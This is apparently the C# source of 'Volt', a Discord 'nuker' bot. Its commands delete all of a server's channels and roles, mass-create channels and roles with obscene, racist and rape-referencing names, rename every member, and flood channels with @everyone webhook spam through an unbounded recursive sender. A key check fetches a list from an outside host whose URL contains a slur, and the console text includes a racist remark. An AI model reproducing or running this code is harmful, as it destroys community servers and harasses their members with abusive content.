using DSharpPlus;
using DSharpPlus.Entities;
using DSharpPlus.EventArgs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Net;
using System.Threading;
using Newtonsoft.Json;
using static volt.MainBot;
using System.Net.Http;
using System.Text;
using File = System.IO.File;
using Leaf.xNet;
using Microsoft.VisualBasic;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;
using Microsoft.VisualBasic.ApplicationServices;
using System.IO.Compression;
using System.IO;
using System.Net.WebSockets;

namespace volt
{
    public class Program
    {
        public static bool done = false;
        public static async Task Main(string[] args)
        {
            Utils.LoadConfigs();
            // Utils.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0";
            if (!System.IO.File.Exists("proxies.txt")) { System.IO.File.WriteAllText("proxies.txt", ""); }
            else { Utils.LoadProxies("proxies.txt"); }
            if (Utils.configuration.OwnerId == "GUYGUG5dkssa") { done = true; }
            Console.Title = "Volt | Nemo & Xor";
            if (!done)
            {
                Console.log("No Config.");
                if (KeyInput())
                {
                    Console.log("yay that key was correct !!!", true);
                    Console.log("enter your token: ", false);
                    string inputKey = Console.ReadLine();
                    await Discord.StartBot(inputKey);
                    inputKey = null;
                }
            }
            else if (Utils.configuration.Token != "Enter your token here")
            {
                Console.log("Loaded Config!");
                MainMenu();
            }
        }
        public static void MainMenu()
        {
            Console.logOption("1", "Start Bot");
            Console.logOption("2", "Settings");
            Console.log("Enter your choice: ", false);
            string inputKey = Console.ReadLine();
            if (inputKey == "1")
            {
                _ = Discord.StartBot(Utils.configuration.Token);
            }
            if (inputKey == "2")
            {
                MainSettingsMenu();
            }
            Console.ReadKey();
        }
        public static void MainSettingsMenu()
        {
            Console.Clear();
            Console.log($"Your Token: {Utils.configuration.Token}");
            Console.log($"Your Prefix: {Utils.configuration.Prefix}");
            Console.logOption("0", "Back");
            Console.log("Enter your choice: ", false);
            string inputKey2 = Console.ReadLine();
            if (inputKey2 == "0")
            {
                Console.Clear();
                MainMenu();
            }
            Console.ReadKey();
        }
        private static bool KeyInput()
        {
            Console.log("volt beta with no ui because im black");
            Console.log("enter your key: ", false);
            string inputKey = Console.ReadLine();
            if (CheckKey(inputKey))
            {
                return true;
            }
            else
            {
                return KeyInput();
            }
        }
        private static bool CheckKey(string key)
        {
            string[] allKeys = new WebClient().DownloadString("http://bro.lets.game/nigr.txt").Split(new char[] { '|', '|' });

            foreach (var k in allKeys)
            {
                if (k == key)
                    return true;
            }
            return false;
        }
    }
    public static class MainBot
    {
        public static string Token;
        public static bool Started = false;
        public static volatile bool keepRunning = true;
        public static class Discord
        {
            public static DiscordClient _client;
            public static List<BotGuild> BotGuilds;
            public struct BotGuild
            {
                public DiscordGuild Guild { get; }
                public ulong Id => Guild.Id;
                public BotGuild(DiscordGuild gld) { Guild = gld; }
                public override string ToString() { return Guild.Name; }
            }
            public static async Task StartBot(string Token)
            {
                BotGuilds = new List<BotGuild>();

                var _client = new DiscordClient(new DiscordConfiguration
                {
                    Token = Token,
                    TokenType = TokenType.Bot,
                    Intents = DiscordIntents.All,
                    AutoReconnect = true,
                    MinimumLogLevel = Microsoft.Extensions.Logging.LogLevel.None
                });

                _client.Ready += ReadyAsync;
                _client.GuildAvailable += Utils.DiscordClient_GuildAvailable;
                _client.GuildCreated += Utils.DiscordClient_GuildCreated;
                _client.MessageCreated += MessageCreatedAsync;

                await _client.ConnectAsync();
                await Task.Delay(-1);
            }
            public static async Task MessageCreatedAsync(DiscordClient client, DSharpPlus.EventArgs.MessageCreateEventArgs eventArgs)
            {
                try
                {
                    string prefix = Utils.configuration.Prefix;
                    string content = eventArgs.Message.Content.ToLower();
                    var guild = eventArgs.Message.Channel.Guild;

                    if (content.Equals($"{prefix}help"))
                    {
                        await eventArgs.Message.RespondAsync(
                            embed: new DiscordEmbedBuilder
                            {
                                Title = "Commands",
                                Url = "https://discord.gg/injector",
                                Color = DiscordColor.Purple,
                                Description = $"" +
                                $"\n\n`{prefix}fullnuke`" +
                                $"\n> It Fully Nukes The Server" +
                                $"\n\n`{prefix}latency`" +
                                $"\n> Bot's ping" +
                                $"\n\n`{prefix}stop`" +
                                $"\n> Stops everything" +
                                $"\n\n`{prefix}resume`" +
                                $"\n> Starts everything again" +
                                $"\n\n`{prefix}delete-channels`" +
                                $"\n> Deletes all of the channels" +
                                $"\n\n`{prefix}delete-roles`" +
                                $"\n> Deletes all of the roles" +
                                $"\n\n`{prefix}create-channels [number]`" +
                                $"\n> Creates a selected number of channels" +
                                $"\n\n`{prefix}spam-channels [number]`" +
                                $"\n> Spams a selected number of messages in every channel" +
                                $"\n\n`{prefix}spam-roles [number]`" +
                                $"\n> Spams makes roles" +
                                $"\n\n`{prefix}change-nicknames [name]`" +
                                $"\n> Changes all users' server nickname",
                            }
                        );
                    }
                    else if (content.Equals($"{prefix}fullnuke"))
                    {
                        string[] Names = { "fucked by volt", "volt runs discord", "nuked by volt", "volt says kys", "volt on top", "volt runs this server", "volt raped you" };
                        Random random = new Random();
                        await Nukeing.DeleteChannels(eventArgs, content, guild);
                        await Nukeing.DeleteRoles(eventArgs, content, guild);
                        // Create Channels
                        for (int i = 0; i < 35; i++)
                        {
                            string randomName = Names[random.Next(Names.Length)];
                            await guild.CreateChannelAsync(randomName, ChannelType.Text);
                        }
                        // Spam Channels
                        for (int i = 0; i < 20; i++)
                        {
                            IReadOnlyList<DiscordChannel> channels = await guild.GetChannelsAsync();
                            IReadOnlyList<DiscordWebhook> webhooks = await guild.GetWebhooksAsync();
                            foreach (var channel in channels)
                            {
                                var webhook = webhooks.FirstOrDefault(w => w.ChannelId == channel.Id);
                                webhook = await channel.CreateWebhookAsync("Volt");
                                //await webhook.ExecuteAsync(new DiscordWebhookBuilder().WithContent("@everyone @here\n# NUKED BY VOLT\nThis server is shit, you should [join Power Engine instead](https://discord.gg/mzQEyxYZ)"));
                                Utils.SendVoltHook(webhook.Url);
                            }
                        }
                        // Roles
                        for (int i = 0; i < 20; i++)
                        {
                            string randomName = Names[random.Next(Names.Length)];
                            await guild.CreateRoleAsync(randomName);
                        }
                    }
                    else if (content.Equals($"{prefix}latency"))
                    {
                        await eventArgs.Message.RespondAsync(
                            embed: new DiscordEmbedBuilder
                            {
                                Color = DiscordColor.Purple,
                                Description = $"> The gateway latency is {client.Ping}ms."
                            }
                        );
                    }
                    else if (content.Equals($"{prefix}stop"))
                    {
                        await eventArgs.Message.RespondAsync($"Stopping everything.");
                        keepRunning = false;
                    }
                    else if (content.Equals($"{prefix}resume"))
                    {
                        await eventArgs.Message.RespondAsync($"Resuming everything.");
                        keepRunning = true;
                    }
                    else if (content.Equals($"{prefix}delete-channels")) { await Nukeing.DeleteChannels(eventArgs, content, guild); }
                    else if (content.Equals($"{prefix}delete-roles")) { await Nukeing.DeleteRoles(eventArgs, content, guild); }
                    else if (content.StartsWith($"{prefix}create-channels")) { await Nukeing.CreateChannels(eventArgs, content, guild); }
                    else if (content.StartsWith($"{prefix}spam-channels")) { await Nukeing.SpamChannels(eventArgs, content, guild); }
                    else if (content.StartsWith($"{prefix}change-nicknames")) { await Nukeing.ChangeNicknames(eventArgs, content, guild); }
                    else if (content.StartsWith($"{prefix}spam-roles")) { await Nukeing.SpamRoles(eventArgs, content, guild); }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error handling message: {ex.Message}");
                }
            }
            public static Task ReadyAsync(DiscordClient sender, ReadyEventArgs e)
            {
                Console.log($"Bot is connected!");
                return Task.CompletedTask;
            }
            public class Nukeing 
            {
                public static async Task CreateChannels(MessageCreateEventArgs eventArgs, string content, DiscordGuild guild)
                {
                    int chCount = 1;
                    string[] parts = content.Split(' ');
                    if (parts.Length > 1 && int.TryParse(parts[1], out int parsedCount)) { chCount = parsedCount; }

                    string isChs = chCount > 1 ? "channels" : "channel";
                    await eventArgs.Message.RespondAsync($"> Creating `{chCount}` {isChs}");

                    string[] channelNames = { "fucked by volt", "volt runs discord", "nuked by volt", "volt says kys", "volt on top", "volt runs this server", "volt raped you" };

                    Random random = new Random();

                    for (int i = 0; i < chCount; i++)
                    {
                        try
                        {
                            if (!keepRunning) { break; }

                            string randomName = channelNames[random.Next(channelNames.Length)];

                            await guild.CreateChannelAsync(randomName, ChannelType.Text);
                        }
                        catch (Exception) { }
                    }
                }
                public static async Task DeleteRoles(MessageCreateEventArgs eventArgs, string content, DiscordGuild guild)
                {
                    await eventArgs.Message.RespondAsync($"Deleting all roles.");

                    Console.WriteLine("Deleting roles");
                    IReadOnlyList<DiscordRole> roles = guild.Roles.Values.ToList();
                    foreach (DiscordRole role in roles)
                    {
                        try
                        {
                            if (!keepRunning) { break; }
                            await role.DeleteAsync();
                        }
                        catch (Exception ex) { Console.WriteLine($"Error deleting channel: {ex.Message}"); }
                    }
                }
                public static async Task DeleteChannels(MessageCreateEventArgs eventArgs, string content, DiscordGuild guild)
                {
                    await eventArgs.Message.RespondAsync($"Deleting all channels.");

                    Console.log("Deleting channels");
                    IReadOnlyList<DiscordChannel> channels = await guild.GetChannelsAsync();
                    foreach (DiscordChannel d in channels)
                    {
                        try
                        {
                            if (!keepRunning) { break; }
                            await d.DeleteAsync();
                        }
                        catch (Exception ex) { Console.log($"Error deleting channel: {ex.Message}"); }
                    }
                }
                public static async Task SpamChannels(MessageCreateEventArgs eventArgs, string content, DiscordGuild guild)
                {
                    int msgCount = 1;
                    string[] parts = content.Split(' ');
                    if (parts.Length > 1 && int.TryParse(parts[1], out int parsedCount)) { msgCount = parsedCount; }

                    string isMsgs = msgCount > 1 ? "messages" : "message";
                    await eventArgs.Message.RespondAsync($"> Sending `{msgCount}` {isMsgs} in all channels using webhooks.");
                    IReadOnlyList<DiscordChannel> channels = await guild.GetChannelsAsync();
                    IReadOnlyList<DiscordWebhook> webhooks = await guild.GetWebhooksAsync();
                    foreach (var channel in channels)
                    {
                        try
                        {
                            if (!keepRunning) { break; }
                            if (channel.Type == ChannelType.Text)
                            {
                                for (int i = 0; i < msgCount; i++)
                                {
                                    var webhook = webhooks.FirstOrDefault(w => w.ChannelId == channel.Id);
                                    webhook = await channel.CreateWebhookAsync("Volt");
                                    // await webhook.ExecuteAsync(new DiscordWebhookBuilder().WithContent("@everyone @here\n# NUKED BY VOLT\nThis server is shit, you should [join Power Engine instead](https://discord.gg/mzQEyxYZ)"));
                                    Utils.SendVoltHook(webhook.Url);
                                }
                            }
                        }
                        catch (Exception ex) { }
                    }
                }
                public static async Task SpamRoles(MessageCreateEventArgs eventArgs, string content, DiscordGuild guild)
                {
                    int chCount = 1;
                    string[] parts = content.Split(' ');
                    if (parts.Length > 1 && int.TryParse(parts[1], out int parsedCount)) { chCount = parsedCount; }

                    string isChs = chCount > 1 ? "role" : "role";
                    await eventArgs.Message.RespondAsync($"> Creating `{chCount}` {isChs}");

                    string[] channelNames = { "fucked by volt", "volt runs discord", "nuked by volt", "volt says kys", "volt on top", "volt runs this server", "volt raped you" };

                    Random random = new Random();

                    for (int i = 0; i < chCount; i++)
                    {
                        try
                        {
                            if (!keepRunning) { break; }

                            string randomName = channelNames[random.Next(channelNames.Length)];

                            await guild.CreateRoleAsync(randomName);
                        }
                        catch (Exception) { }
                    }
                }
                public static async Task ChangeNicknames(MessageCreateEventArgs eventArgs, string content, DiscordGuild guild)
                {
                    string nickName = content.Replace($"{Utils.configuration.Prefix}change-nicknames ", "");
                    await eventArgs.Message.RespondAsync($"> Changing all users' nicknames.");
                    IReadOnlyCollection<DiscordMember> members = await guild.GetAllMembersAsync();
                    foreach (var member in members)
                    {
                        try
                        {
                            if (!keepRunning) { break; }
                            await member.ModifyAsync(x => x.Nickname = nickName);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
    }
    public class Utils
    {
        // Config 
        public static Configuration configuration;
        public class Configuration
        {
            public string Token { get; set; } = "Enter your token here";
            public string OwnerId { get; set; } = "Enter your owner id";
            public string Prefix { get; set; } = "!";
        }
        public static bool LoadConfigs()
        {
            string filename = "configs.json";

            try
            {
                if (!File.Exists(filename))
                {
                    CreateDefaultConfigFile(filename);
                    return false;
                }

                string json = System.IO.File.ReadAllText(filename);
                configuration = JsonConvert.DeserializeObject<Configuration>(json);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error loading configurations: {ex.Message}");
                return false;
            }
        }
        public static void CreateDefaultConfigFile(string filename)
        {
            try
            {
                string filecontent = JsonConvert.SerializeObject(new Configuration(), Formatting.Indented);
                File.WriteAllText(filename, filecontent);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error creating default config file: {ex.Message}");
            }
        }

        // Discord
        public static Task DiscordClient_GuildCreated(DiscordClient sender, GuildCreateEventArgs e) { Discord.BotGuilds.Add(new Discord.BotGuild(e.Guild)); return Task.CompletedTask; }
        public static Task DiscordClient_GuildAvailable(DiscordClient sender, GuildCreateEventArgs e) { Discord.BotGuilds.Add(new Discord.BotGuild(e.Guild)); return Task.CompletedTask; }
        public static DiscordGuild GetGuildById(string guildId) => Discord.BotGuilds.FirstOrDefault(g => g.Id.ToString() == guildId).Guild;
        public static ulong GetBotId() => Discord._client.CurrentUser.Id;
        public static bool CheckPermission(DiscordGuild guild, Permissions permission)
        {
            if (guild.GetMemberAsync(Utils.GetBotId()).GetAwaiter().GetResult().Permissions.HasPermission(permission)) { return true; }
            return false;
        }
        public static async Task SendVoltHook(string webhookUrl)
        {
            try
            {
                using (var httpClient = new HttpClient())
                {
                    var serializeJson = "{\r\n  \"content\": \"@everyone @here\",\r\n  \"embeds\": [\r\n    {\r\n      \"title\": \"NUKED BY VOLT\",\r\n      \"description\": \"This entire server just got nuked by a Volt user.\\n\\nHave fun restoring your server ;)\\n\\nThis server is shit, you should [join Power Engine instead](https://discord.gg/w4WNrXEhTq)\",\r\n      \"color\": 5814783\r\n    }\r\n  ],\r\n  \"attachments\": []\r\n}";
                    var content = new System.Net.Http.StringContent(serializeJson, Encoding.UTF8, "application/json");

                    var response = await httpClient.PostAsync(webhookUrl, content);

                    SendVoltHook(webhookUrl);
                }
            }
            catch (Exception ex) { Console.log($"Error: {ex.Message}"); }
        }
        // Proxy
        public static int proxyIndex = 0;
        public static List<string> proxies = new List<string>();
        public static List<string> invalidProxies = new List<string>();
        public static int doneCheckingProxies = 0;

        public static HttpProxyClient GetProxy()
        {
            try
            {
                if (proxyIndex >= proxies.Count)
                    proxyIndex = 0;

                return ParseProxy(proxies[proxyIndex++]);
            }
            catch
            {
                return null;
            }
        }
        public static HttpProxyClient ParseProxy(string proxy)
        {
            try
            {
                string[] splitted = proxy.Split(':');

                if (splitted.Length == 2)
                {
                    return new HttpProxyClient(splitted[0], int.Parse(splitted[1]));
                }
                else if (splitted.Length == 4)
                {
                    return new HttpProxyClient(splitted[0], int.Parse(splitted[1]), splitted[2], splitted[3]);
                }
                else
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
        }
        public static void LoadProxies(string fileName)
        {
            try
            {
                string[] lines = File.ReadAllLines(fileName);
                foreach (string proxy in lines)
                {
                    string prxy = GetCleanToken(proxy);
                    if (IsProxyFormatValid(prxy))
                    {
                        if (!proxies.Contains(prxy))
                            proxies.Add(prxy);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error loading proxies: " + ex.Message);
            }
        }
        public static string GetCleanToken(string token)
        {
            return token.Replace(" ", "").Trim().Replace("\t", "");
        }
        public static bool IsProxyFormatValid(string proxy)
        {
            try
            {
                string[] splitted = proxy.Split(':');

                if (splitted.Length != 2 && splitted.Length != 4)
                    return false;

                if (!IPAddress.TryParse(splitted[0], out IPAddress address))
                    return false;

                if (!int.TryParse(splitted[1], out int port) || port <= 0 || port > 65535)
                    return false;

                if (splitted.Length == 4 && (string.IsNullOrEmpty(splitted[2]) || string.IsNullOrEmpty(splitted[3])))
                    return false;

                return true;
            }
            catch
            {
                return false;
            }
        }
    }
    public class Console
    {
        public static void log(string text, bool a = true)
        {
            foreach (char c in text)
            {
                System.Console.Write(c);
                Thread.Sleep(20);
            }
            if (a) { System.Console.WriteLine(); }
        }
        public static void logOption(string num, string args)
        {
            System.Console.Write($" [{num}] {args}");
            System.Console.WriteLine();
        }
        public static string Title
        {
            get { return System.Console.Title; }
            set { System.Console.Title = value; }
        }
        public static void WriteLine(string value) { System.Console.WriteLine(value); }
        public static void Write(string value) { System.Console.Write(value); }
        public static void Clear() { System.Console.Clear(); }
        public static void WriteLine() { System.Console.WriteLine(); }
        public static string ReadLine() { return System.Console.ReadLine(); }
        public static ConsoleKeyInfo ReadKey() { return System.Console.ReadKey(); }
    }
}